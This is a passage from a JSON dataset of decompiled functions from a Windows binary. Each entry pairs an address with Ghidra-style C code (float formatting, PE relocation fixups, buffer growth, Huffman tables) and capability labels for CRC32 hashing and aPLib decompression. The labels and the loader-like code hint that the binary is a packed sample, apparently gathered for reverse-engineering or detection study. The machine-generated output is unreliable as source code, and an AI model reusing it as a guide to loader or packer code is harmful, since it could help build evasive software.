var_1ah._0_2_ = arg_ch;\n    uVar11 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n    if (0x3ffe < uVar11 >> 0x10) {\n        var_4ch._0_2_ = var_4ch + 1;\n        var_50h = 0;\n        var_10h._0_1_ = 0;\n        var_10h._1_1_ = 0;\n        var_10h._2_2_ = 0;\n        var_ch._0_2_ = 0;\n        var_ch._2_2_ = 0;\n        var_8h._0_2_ = 0;\n        var_8h._2_2_ = 0;\n        uVar11 = uVar11 >> 0x10 & 0x7fff;\n        iVar18 = uVar11 + 0x3ffb;\n        if ((uVar11 < 0x7fff) && (iVar18 < 0xbffe)) {\n            if (0x3fbf < iVar18) {\n                if ((((uVar11 == 0) &&\n                     (iVar18 = uVar11 + 0x3ffc, \n                     (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) & 0x7fffffff) == 0)) &&\n                    (CONCAT22(var_1ah, var_1ch) == 0)) && (CONCAT22(var_20h._2_2_, var_20h) == 0)) {\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                    goto code_r0x004408b0;\n                }\n                var_54h = 0;\n                puVar20 = &var_ch;\n                var_40h = 5;\n                do {\n                    var_48h = var_40h;\n                    if (0 < var_40h) {\n                        var_58h = &var_28h;\n                        puVar6 = &var_20h + var_54h * 2;\n                        do {\n                            bVar5 = false;\n                            uVar11 = puVar20[-1] + *var_58h * *puVar6;\n                            if ((uVar11 < puVar20[-1]) || (uVar11 < *var_58h * *puVar6)) {\n                                bVar5 = true;\n                            }\n                            puVar20[-1] = uVar11;\n                            if (bVar5) {\n                                *puVar20 = *puVar20 + 1;\n                            }\n                            var_58h = var_58h + -2;\n                            puVar6 = puVar6 + 1;\n                            var_48h = var_48h + -1;\n                        } while (0 < var_48h);\n                    }\n                    puVar20 = puVar20 + 2;\n                    var_54h = var_54h + 1;\n                    var_40h = var_40h + -1;\n                } while (0 < var_40h);\n                iVar18 = iVar18 + 0xc002;\n                if (iVar18 < 1) {\ncode_r0x004407ab:\n                    uVar17 = iVar18 + 0xffff;\n                    if (uVar17 < 0) {\n                        uVar11 = -(iVar18 + 0xffff) & 0xffff;\n                        uVar17 = uVar17 + uVar11;\n                        do {\n                            if ((var_10h & 1) != 0) {\n                                var_50h = var_50h + 1;\n                            }\n                            iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                            uVar13 = CONCAT22(var_ch._2_2_, var_ch);\n                            iVar18 = CONCAT22(var_ch._2_2_, var_ch);\n                            var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                            var_8h._2_2_ = var_8h._2_2_ >> 1;\n                            var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                            uVar14 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                            var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                            uVar11 = uVar11 - 1;\n                            var_ch._0_2_ = uVar13 >> 1;\n                            var_10h._0_1_ = uVar14;\n                            var_10h._1_1_ = uVar14 >> 8;\n                        } while (uVar11 != 0);\n                        if (var_50h != 0) {\n                            var_10h._0_1_ = var_10h | 1;\n                        }\n                    }\n                }\n                else {\n                    do {\n                        uVar7 = var_ch._2_2_;\n                        uVar17 = var_10h._2_2_;\n                        if (var_8h._2_2_ < 0) break;\n                        iVar3 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                        var_10h._0_1_ = iVar3;\n                        var_10h._1_1_ = iVar3 >> 8;\n                        var_10h._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                        var_ch._0_2_ = iVar3 | uVar17 >> 0xf;\n                        var_ch._2_2_ = iVar3 >> 0x10;\n                        iVar3 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                        var_8h._0_2_ = iVar3 | uVar7 >> 0xf;\n                        iVar18 = iVar18 + 0xffff;\n                        var_8h._2_2_ = iVar3 >> 0x10;\n                    } while (0 < iVar18);\n                    uVar17 = iVar18;\n                    if (uVar17 < 1) goto code_r0x004407ab;\n                }\n                if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                   ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                    if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                        var_10h._2_2_ = 0;\n                        var_ch._0_2_ = 0;\n                        if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                            var_ch._2_2_ = 0;\n                            var_8h._0_2_ = 0;\n                            if (var_8h._2_2_ == 0xffff) {\n                                var_8h._2_2_ = 0x8000;\n                                uVar17 = uVar17 + 1;\n                            }\n                            else {\n                                var_8h._2_2_ = var_8h._2_2_ + 1;\n                            }\n                        }\n                        else {\n                            iVar18 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                            var_ch._2_2_ = iVar18;\n                            var_8h._0_2_ = iVar18 >> 0x10;\n                        }\n                    }\n                    else {\n                        iVar18 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                        var_10h._2_2_ = iVar18;\n                        var_ch._0_2_ = iVar18 >> 0x10;\n                    }\n                }\n                if (uVar17 < 0x7fff) {\n                    var_16h._1_1_ = uVar17 >> 8 | var_16h._1_1_ & 0x80;\n                    var_20h._0_2_ = var_10h._2_2_;\n                    arg_8h = CONCAT22(var_ch._2_2_, var_ch);\n                    arg_ch = CONCAT22(var_8h._2_2_, var_8h);\n                    var_16h._0_1_ = uVar17;\n                }\n                else {\n                    var_20h._0_2_ = 0;\n                    arg_8h = 0;\n                    iVar18 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    arg_ch = 0x80000000;\n                    var_16h._0_1_ = iVar18 >> 0x10;\n                    var_16h._1_1_ = iVar18 >> 0x18;\n                }\n                goto code_r0x004408b0;\n            }\n            iVar18 = 0;\n        }\n        else {\n            iVar18 = (((var_16h._1_1_ & 0x80) == 0) - 1 & 0x80000000) + 0x7fff8000;\n        }\n        arg_8h = 0;\n        var_20h._0_2_ = 0;\n        arg_ch = iVar18 << 0x10;\n        var_16h._0_1_ = iVar18 >> 0x10;\n        var_16h._1_1_ = iVar18 >> 0x18;\n    }\ncode_r0x004408b0:\n    *arg_1ch = var_4ch;\n    if (((arg_18h & 1) == 0) || (arg_14h = arg_14h + var_4ch,  0 < arg_14h)) {\n        if (0x15 < arg_14h) {\n            arg_14h = 0x15;\n        }\n        iVar18 = CONCAT11(var_16h._1_1_, var_16h) - 0x3ffe;\n        var_16h._0_1_ = 0;\n        var_16h._1_1_ = 0;\n        var_44h = 8;\n        do {\n            var_1ah._2_2_ = arg_ch >> 0x10;\n            var_1ah._0_2_ = arg_ch;\n            var_1ch = arg_8h >> 0x10;\n            var_20h._2_2_ = arg_8h;\n            uVar17 = var_20h._2_2_;\n            iVar3 = CONCAT22(var_20h._2_2_, var_20h) << 1;\n            var_20h._0_2_ = iVar3;\n            var_20h._2_2_ = iVar3 >> 0x10;\n            iVar3 = CONCAT22(var_1ah, var_1ch) * 2;\n            var_1ch = iVar3 | uVar17 >> 0xf;\n            arg_8h = CONCAT22(var_1ch, var_20h._2_2_);\n            iVar4 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2;\n            var_1ah._2_2_ = iVar4 | var_1ah >> 0xf;\n            var_44h = var_44h + -1;\n            var_1ah._0_2_ = iVar3 >> 0x10;\n            arg_ch = CONCAT22(var_1ah._2_2_, var_1ah);\n            var_16h._0_1_ = iVar4 >> 0x10;\n            var_16h._1_1_ = iVar4 >> 0x18;\n        } while (var_44h != 0);\n        if ((iVar18 < 0) && (uVar11 = -iVar18 & 0xff,  uVar11 != 0)) {\n            do {\n                iVar3 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n                uVar14 = CONCAT22(var_1ah, var_1ch);\n                iVar18 = CONCAT22(var_1ah, var_1ch);\n                uVar13 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) >> 1;\n                var_1ah._2_2_ = uVar13;\n                var_16h._0_1_ = uVar13 >> 0x10;\n                var_16h._1_1_ = var_16h._1_1_ >> 1;\n                var_1ah._0_2_ = var_1ah >> 1 | (iVar3 << 0x1f) >> 0x10;\n                uVar13 = CONCAT22(var_20h._2_2_, var_20h);\n                var_20h._2_2_ = var_20h._2_2_ >> 1 | (iVar18 << 0x1f) >> 0x10;\n                uVar11 = uVar11 - 1;\n                var_1ch = uVar14 >> 1;\n                var_20h._0_2_ = uVar13 >> 1;\n            } while (0 < uVar11);\n        }\n        arg_14h = arg_14h + 1;\n        piVar1 = arg_1ch + 2;\n        piVar15 = piVar1;\n        uVar17 = var_20h;\n        uVar7 = var_20h._2_2_;\n        uVar9 = var_1ch;\n        uVar10 = var_1ah;\n        while( true ) {\n            arg_ch = CONCAT22(var_1ah._2_2_, uVar10);\n            arg_8h = CONCAT22(uVar9, uVar7);\n            if (arg_14h < 1) break;\n            var_34h = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n            uVar13 = CONCAT22(uVar7, uVar17) * 4;\n            uVar11 = CONCAT22(uVar10, uVar9) * 2;\n            uVar14 = (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) * 2 | uVar10 >> 0xf) * 2 |\n                     uVar11 >> 0x1f;\n            uVar19 = (uVar11 | uVar7 >> 0xf) * 2 | (CONCAT22(uVar7, uVar17) << 1) >> 0x1f;\n            uVar11 = CONCAT22(uVar7, uVar17) + uVar13;\n            if ((uVar11 < uVar13) || (uVar13 = uVar19,  uVar11 < CONCAT22(uVar7, uVar17))) {\n                uVar13 = uVar19 + 1;\n                bVar5 = false;\n                if ((uVar13 < uVar19) || (uVar13 == 0)) {\n                    bVar5 = true;\n                }\n                if (bVar5) {\n                    uVar14 = uVar14 + 1;\n                }\n            }\n            uVar19 = CONCAT22(uVar10, uVar9) + uVar13;\n            if ((uVar19 < uVar13) || (uVar19 < CONCAT22(uVar10, uVar9))) {\n                uVar14 = uVar14 + 1;\n            }\n            iVar18 = (uVar14 + var_34h) * 2;\n            var_1ah._2_2_ = iVar18 | uVar19 >> 0x1f;\n            var_20h._0_2_ = uVar11 * 2;\n            var_20h._2_2_ = uVar11 * 2 >> 0x10;\n            var_16h._0_1_ = iVar18 >> 0x10;\n            var_1ch = uVar19 * 2 | uVar11 >> 0x1f;\n            *piVar15 = (iVar18 >> 0x18) + '0';\n            piVar15 = piVar15 + 1;\n            arg_14h = arg_14h + -1;\n            var_1ah._0_2_ = uVar19 * 2 >> 0x10;\n            var_16h._1_1_ = 0;\n            var_3ch._0_2_ = uVar17;\n            var_3ch._2_2_ = uVar7;\n            var_38h._0_2_ = uVar9;\n            var_38h._2_2_ = uVar10;\n            uVar17 = var_20h;\n            uVar7 = var_20h._2_2_;\n            uVar9 = var_1ch;\n            uVar10 = var_1ah;\n        }\n        piVar16 = piVar15 + -1;\n        var_20h._0_2_ = uVar17;\n        if (*(piVar15 + -1) < '5') {\n            for (; (piVar1 <= piVar16 && (*piVar16 == '0')); piVar16 = piVar16 + -1) {\n            }\n            if (piVar16 < piVar1) {\n                *arg_1ch = 0;\n                *(arg_1ch + 3) = 1;\n                *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n                *piVar1 = 0x30;\n                *(arg_1ch + 5) = 0;\n                goto code_r0x00440a78;\n            }\n        }\n        else {\n            for (; (piVar1 <= piVar16 && (*piVar16 == '9')); piVar16 = piVar16 + -1) {\n                *piVar16 = 0x30;\n            }\n            if (piVar16 < piVar1) {\n                piVar16 = piVar16 + 1;\n                *arg_1ch = *arg_1ch + 1;\n            }\n            *piVar16 = *piVar16 + '\\x01';\n        }\n        cVar12 = (piVar16 - arg_1ch) + -3;\n        *(arg_1ch + 3) = cVar12;\n        *(cVar12 + 4 + arg_1ch) = 0;\n    }\n    else {\n        *arg_1ch = 0;\n        *(arg_1ch + 3) = 0x3001;\n        *(arg_1ch + 1) = ((var_60h != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 5) = 0;\n    }\ncode_r0x00440a78:\n    unique0x100008d2 = arg_8h;\n    var_1ah = arg_ch;\n    fcn.0042d636(1);\n    return;\ncode_r0x004402eb:\n    pcVar21 = \"1#QNAN\";\n    goto code_r0x004402f0;\n}\n",
        "token_count": 8767
    },
    "00404910": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404910(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(arg_8h + 0x74);\n    if (*(arg_8h + 0x144) == iVar2) {\n        return 0;\n    }\n    if ((*(arg_8h + 0xe0) != 0) && (*(arg_8h + 0xe4) != 0)) {\n        iVar3 = *(arg_8h + 0x144);\n        piVar6 = iVar3 + *(arg_8h + 0xe0);\n        piVar1 = *(arg_8h + 0xe4) + -8 + piVar6;\n        do {\n            if (piVar1 <= piVar6) {\n                return 0;\n            }\n            uVar8 = piVar6[1] - 8U >> 1;\n            piVar9 = piVar6 + 2;\n            uVar7 = 0;\n            if (uVar8 != 0) {\n                do {\n                    uVar4 = *piVar9 >> 0xc;\n                    if (uVar4 != 0) {\n                        if (uVar4 != 3) {\n                            return 5;\n                        }\n                        piVar5 = (*piVar9 & 0xfff) + *piVar6 + *(arg_8h + 0x144);\n                        *piVar5 = *piVar5 + (iVar3 - iVar2);\n                    }\n                    uVar7 = uVar7 + 1;\n                    piVar9 = piVar9 + 2;\n                } while (uVar7 < uVar8);\n            }\n            piVar6 = piVar6 + piVar6[1];\n        } while( true );\n    }\n    return 4;\n}\n",
        "token_count": 477
    },
    "00409070": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409070(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *extraout_ECX;\n    uint32_t uVar3;\n    \n    iVar1 = *param_1;\n    uVar3 = (param_1[1] - iVar1) / 0x44;\n    if (0x3c3c3c2 < uVar3) {\n        fcn.0042cb30(\"vector<T> too long\");\n        param_1 = extraout_ECX;\n    }\n    uVar2 = (param_1[2] - iVar1) / 0x44;\n    uVar3 = uVar3 + 1;\n    if (uVar2 < uVar3) {\n        if (0x3c3c3c3 - (uVar2 >> 1) < uVar2) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = uVar2 + (uVar2 >> 1);\n        }\n        if (uVar2 < uVar3) {\n            uVar2 = uVar3;\n        }\n        fcn.004091e0(uVar2);\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "00409570": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00409570(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    code *apcStack44 [3];\n    uint32_t var_28h;\n    uint uStack28;\n    uint *puStack24;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x441440;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x454664 ^ &var_ch_3;\n    var_1ch = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = param_1[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack60;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.0042ddfe(uVar5 + 1),  puVar2 = var_1ch,  arg_8h == NULL)) {\n        uStack28 = 0;\n        fcn.0042d7ec(&uStack28);\n        apcStack44[0] = vtable.std::bad_alloc.0;\n        fcn.0042f5f6(apcStack44, 0x4510e8);\n        var_28h = var_4h;\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        var_1ch = &stack0xffffffb8;\n        fcn.004096e0(var_4h + 1);\n        return 0x409646;\n    }\n    var_1ch = puVar2;\n    if (param_3 != 0) {\n        arg_ch = param_1;\n        if (0xf < param_1[5]) {\n            arg_ch = *param_1;\n        }\n        fcn.0042f700(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < param_1[5]) {\n        fcn.0042d62b();\n    }\n    *param_1 = 0;\n    *param_1 = arg_8h;\n    param_1[5] = uVar5;\n    param_1[4] = param_3;\n    if (0xf < uVar5) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 856
    },
    "0040b050": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_118h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040b050(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t **arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h, uint32_t *arg_24h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *in_ECX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *in_EDX;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_118h;\n    uint32_t **var_dch;\n    uint32_t **var_d8h;\n    int32_t var_d4h;\n    uint32_t var_d0h;\n    int32_t var_cch;\n    uint32_t *var_c8h;\n    uint32_t *var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    uint32_t var_b8h;\n    uint32_t var_b4h;\n    uint32_t var_b0h;\n    uint32_t *var_ach;\n    uint32_t var_a8h;\n    uint32_t var_a4h;\n    uint32_t var_a0h;\n    uint32_t *var_9ch;\n    int32_t var_98h;\n    uint32_t *var_94h;\n    uint32_t var_90h;\n    uint32_t var_8ch;\n    uint var_88h;\n    uint var_84h;\n    int32_t aiStack132 [14];\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    var_cch = arg_20h;\n    var_c4h = arg_24h;\n    var_b4h = arg_8h;\n    var_d8h = arg_18h;\n    var_48h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_34h = 0;\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    puVar4 = in_ECX;\n    uVar6 = arg_8h;\n    do {\n        (&var_48h)[*puVar4] = (&var_48h)[*puVar4] + 1;\n        puVar4 = puVar4 + 1;\n        uVar6 = uVar6 - 1;\n    } while (uVar6 != 0);\n    if (var_48h == arg_8h) {\n        *arg_18h = NULL;\n        *arg_1ch = 0;\n        fcn.0042d636(var_118h);\n        return;\n    }\n    var_8ch = *arg_1ch;\n    var_90h = 1;\n    do {\n        if ((&var_48h)[var_90h] != 0) break;\n        var_90h = var_90h + 1;\n    } while (var_90h < 0x10);\n    if (var_8ch < var_90h) {\n        var_8ch = var_90h;\n    }\n    var_a8h = 0xf;\n    do {\n        if ((&var_48h)[var_a8h] != 0) break;\n        var_a8h = var_a8h - 1;\n    } while (var_a8h != 0);\n    if (var_a8h < var_8ch) {\n        var_8ch = var_a8h;\n    }\n    *arg_1ch = var_8ch;\n    iVar8 = 1 << (var_90h & 0x1f);\n    for (uVar6 = var_90h; var_9ch = in_ECX,  uVar6 < var_a8h; uVar6 = uVar6 + 1) {\n        if (iVar8 - (&var_48h)[uVar6] < 0) goto code_r0x0040b269;\n        iVar8 = (iVar8 - (&var_48h)[uVar6]) * 2;\n    }\n    var_a4h = var_a8h * 4;\n    iVar7 = (&var_48h)[var_a8h];\n    var_d4h = iVar8 - iVar7;\n    if (-1 < var_d4h) {\n        (&var_48h)[var_a8h] = iVar7 + var_d4h;\n        iVar8 = 0;\n        iVar7 = var_a8h - 1;\n        var_84h = 0;\n        if (iVar7 != 0) {\n            iVar9 = 0;\n            do {\n                iVar8 = iVar8 + *(&var_44h + iVar9);\n                iVar7 = iVar7 + -1;\n                *(aiStack132 + iVar9) = iVar8;\n                iVar9 = iVar9 + 4;\n            } while (iVar7 != 0);\n        }\n        uVar6 = 0;\n        do {\n            uVar3 = *in_ECX;\n            in_ECX = in_ECX + 1;\n            var_94h = in_ECX;\n            if (uVar3 != 0) {\n                iVar8 = (&var_88h)[uVar3];\n                arg_24h[iVar8] = uVar6;\n                (&var_88h)[uVar3] = iVar8 + 1;\n            }\n            uVar6 = uVar6 + 1;\n        } while (uVar6 < arg_8h);\n        var_b4h = (&var_88h)[var_a8h];\n        var_94h = arg_24h;\n        uVar6 = 0;\n        iVar8 = -var_8ch;\n        var_b0h = 0;\n        var_88h = 0;\n        var_98h = -1;\n        var_118h = 0;\n        var_9ch = NULL;\n        var_a4h = 0;\n        if (var_90h <= var_a8h) {\n            var_ach = &var_48h + var_90h;\n            uVar3 = var_8ch;\n            var_c8h = in_EDX;\n            do {\n                uVar2 = *var_ach;\n                while (uVar2 != 0) {\n                    var_a0h = uVar2 - 1;\n                    if (iVar8 + uVar3 < var_90h) {\n                        var_c0h = iVar8 - uVar3;\n                        var_d0h = uVar2;\n                        iVar7 = iVar8 + uVar3;\n                        do {\n                            iVar8 = iVar7;\n                            var_c0h = var_c0h + uVar3;\n                            var_98h = var_98h + 1;\n                            uVar6 = var_a8h - iVar8;\n                            if (var_8ch < var_a8h - iVar8) {\n                                uVar6 = var_8ch;\n                            }\n                            uVar3 = var_90h - iVar8;\n                            uVar2 = 1 << (uVar3 & 0x1f);\n                            if ((var_d0h < uVar2) && (iVar7 = uVar2 + (-1 - var_a0h),  puVar4 = var_ach,  uVar3 < uVar6)\n                               ) {\n                                while (uVar3 = uVar3 + 1,  uVar3 < uVar6) {\n                                    var_9ch = puVar4 + 1;\n                                    if (iVar7 * 2 <= *var_9ch) break;\n                                    iVar7 = iVar7 * 2 - *var_9ch;\n                                    puVar4 = var_9ch;\n                                }\n                            }\n                            var_a4h = 1 << (uVar3 & 0x1f);\n                            uVar6 = var_a4h + *var_c8h;\n                            if (0x5a0 < uVar6) goto code_r0x0040b269;\n                            var_9ch = var_cch + *var_c8h * 8;\n                            var_dch = &var_118h + var_98h;\n                            (&var_118h)[var_98h] = var_9ch;\n                            *var_c8h = uVar6;\n                            if (var_98h == 0) {\n                                *var_d8h = var_9ch;\n                            }\n                            else {\n                                (&var_88h)[var_98h] = var_b0h;\n                                uVar6 = var_b0h >> (var_c0h & 0x1f);\n                                puVar4 = var_dch[-1];\n                                var_bch = var_bch & 0xffff0000 | CONCAT11(var_8ch, uVar3);\n                                var_b8h = (var_9ch - puVar4 >> 3) - uVar6;\n                                puVar4[uVar6 * 2] = var_bch;\n                                puVar4[uVar6 * 2 + 1] = var_b8h;\n                            }\n                            iVar7 = iVar8 + var_8ch;\n                            uVar3 = var_8ch;\n                            uVar6 = var_b0h;\n                        } while (iVar8 + var_8ch < var_90h);\n                    }\n                    cVar1 = var_90h;\n                    uVar5 = iVar8;\n                    if (var_94h < var_c4h + var_b4h) {\n                        var_b8h = *var_94h;\n                        if (var_b8h < arg_ch) {\n                            var_bch._0_1_ = (-(var_b8h < 0x100) & 0xa0U) + 0x60;\n                        }\n                        else {\n                            iVar7 = (var_b8h - arg_ch) * 4;\n                            var_bch._0_1_ = *(iVar7 + arg_14h) + 'P';\n                            var_b8h = *(iVar7 + arg_10h);\n                        }\n                        var_94h = var_94h + 1;\n                    }\n                    else {\n                        var_bch._0_1_ = -0x40;\n                    }\n                    var_bch = CONCAT31(CONCAT21(var_bch._2_2_, cVar1 - uVar5), var_bch);\n                    iVar7 = 1 << (cVar1 - uVar5 & 0x1f);\n                    uVar3 = uVar6 >> (uVar5 & 0x1f);\n                    if (uVar3 < var_a4h) {\n                        puVar4 = var_9ch + uVar3 * 2;\n                        do {\n                            *puVar4 = var_bch;\n                            puVar4[1] = var_b8h;\n                            uVar3 = uVar3 + iVar7;\n                            puVar4 = puVar4 + iVar7 * 2;\n                            uVar6 = var_b0h;\n                        } while (uVar3 < var_a4h);\n                    }\n                    uVar2 = 1 << (cVar1 - 1U & 0x1f);\n                    uVar3 = uVar6 & uVar2;\n                    while (uVar3 != 0) {\n                        uVar6 = uVar6 ^ uVar2;\n                        uVar2 = uVar2 >> 1;\n                        uVar3 = uVar6 & uVar2;\n                    }\n                    uVar6 = uVar6 ^ uVar2;\n                    var_b0h = uVar6;\n                    uVar2 = var_a0h;\n                    uVar3 = var_8ch;\n                    if (((1 << (uVar5 & 0x1f)) - 1U & uVar6) != (&var_88h)[var_98h]) {\n                        do {\n                            iVar8 = iVar8 - var_8ch;\n                            var_98h = var_98h + -1;\n                        } while (((1 << (iVar8 & 0x1f)) - 1U & uVar6) != (&var_88h)[var_98h]);\n                    }\n                }\n                var_ach = var_ach + 1;\n                var_90h = var_90h + 1;\n                var_a0h = uVar2;\n            } while (var_90h <= var_a8h);\n        }\n        fcn.0042d636(var_118h);\n        return;\n    }\ncode_r0x0040b269:\n    fcn.0042d636(var_118h);\n    return;\n}\n",
        "token_count": 3028
    },
    "00417280": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.00417280(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t **in_FS_OFFSET;\n    uint *var_4h;\n    uint32_t var_ch_4;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack52;\n    code *apcStack36 [3];\n    uint var_20h;\n    uint32_t *puStack20;\n    int32_t *piStack16;\n    uint var_14h;\n    uint var_10h_3;\n    uint var_ch_3;\n    \n    var_14h = 0x4415e0;\n    piStack16 = *in_FS_OFFSET;\n    uStack52 = *0x454664 ^ &var_ch_3;\n    puStack20 = &uStack52;\n    *in_FS_OFFSET = &piStack16;\n    uVar5 = var_ch_4 | 7;\n    if (uVar5 < 0x7fffffff) {\n        uVar1 = var_4h[5];\n        uVar4 = uVar1 >> 1;\n        var_ch_4 = uVar5;\n        if ((uVar5 / 3 < uVar4) && (var_ch_4 = uVar4 + uVar1,  0x7ffffffe - uVar4 < uVar1)) {\n            var_ch_4 = 0x7ffffffe;\n        }\n    }\n    arg_8h = NULL;\n    uVar5 = var_ch_4 + 1;\n    var_10h_3 = 0;\n    puVar2 = &uStack52;\n    if ((uVar5 != 0) &&\n       ((puVar2 = &uStack52,  0x7fffffff < uVar5 ||\n        (arg_8h = fcn.0042ddfe(uVar5 * 2),  puVar2 = puStack20,  arg_8h == NULL)))) {\n        puStack20 = puVar2;\n        var_20h = 0;\n        fcn.0042d7ec(&var_20h);\n        apcStack36[0] = vtable.std::bad_alloc.0;\n        fcn.0042f5f6(apcStack36, 0x4510e8);\n        var_10h_3 = CONCAT31(var_10h_3._1_3_, 2);\n        puStack20 = &stack0xffffffc0;\n        fcn.004173f0();\n        return 0x417356;\n    }\n    puStack20 = puVar2;\n    puVar3 = arg_8h;\n    if (param_3 != 0) {\n        puVar3 = var_4h;\n        if (7 < var_4h[5]) {\n            puVar3 = *var_4h;\n        }\n        puVar3 = fcn.0042f700(arg_8h, puVar3, param_3 * 2);\n    }\n    if (7 < var_4h[5]) {\n        puVar3 = fcn.0042d62b();\n    }\n    *var_4h = arg_8h;\n    var_4h[5] = var_ch_4;\n    var_4h[4] = param_3;\n    if (7 < var_ch_4) {\n        var_4h = 